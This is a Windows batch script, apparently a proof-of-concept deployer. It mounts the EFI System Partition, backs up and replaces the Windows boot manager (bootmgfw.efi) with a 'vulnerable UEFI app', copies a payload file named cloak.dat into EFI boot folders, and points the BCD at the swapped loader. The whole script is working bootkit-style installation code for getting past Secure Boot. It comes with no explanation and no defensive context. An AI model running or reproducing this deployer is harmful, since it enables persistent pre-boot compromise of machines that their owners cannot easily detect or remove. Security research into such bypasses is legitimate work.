@echo off

mountvol S: /S >nul 2>&1
IF %ERRORLEVEL% NEQ 0 (
    echo Mounting ESP to S:…
    mountvol S: /S
) ELSE (
    echo ESP already mounted as S:
)

SET "ESP=S:"
SET "VULN_APP=%USERPROFILE%\poc\reloader.efi"
SET "PAYLOAD=%USERPROFILE%\poc\cloak.dat"

IF NOT EXIST "%ESP%\EFI\Microsoft\Boot\bootmgfw-orig.efi" (
    echo Backing up bootmgfw.efi…
    copy "%ESP%\EFI\Microsoft\Boot\bootmgfw.efi" "%ESP%\EFI\Microsoft\Boot\bootmgfw-orig.efi" >nul
) ELSE (
    echo Backup already exists: bootmgfw-orig.efi
)

echo Deploying vulnerable UEFI app…
copy "%VULN_APP%" "%ESP%\EFI\Microsoft\Boot\bootmgfw.efi" /Y >nul

echo Copying payload to \\EFI\boot\cloak.dat…
mkdir "%ESP%\EFI\boot" 2>nul
copy "%PAYLOAD%" "%ESP%\EFI\boot\cloak.dat" /Y >nul

echo Copying payload to EFI\Microsoft\Boot\cloak.dat…
copy "%PAYLOAD%" "%ESP%\EFI\Microsoft\Boot\cloak.dat" /Y >nul

echo Updating BCD to launch reloader.efi…
bcdedit /set {bootmgr} path \EFI\Microsoft\Boot\bootmgfw.efi >nul

echo.
echo *** Deployment complete! ***
pause
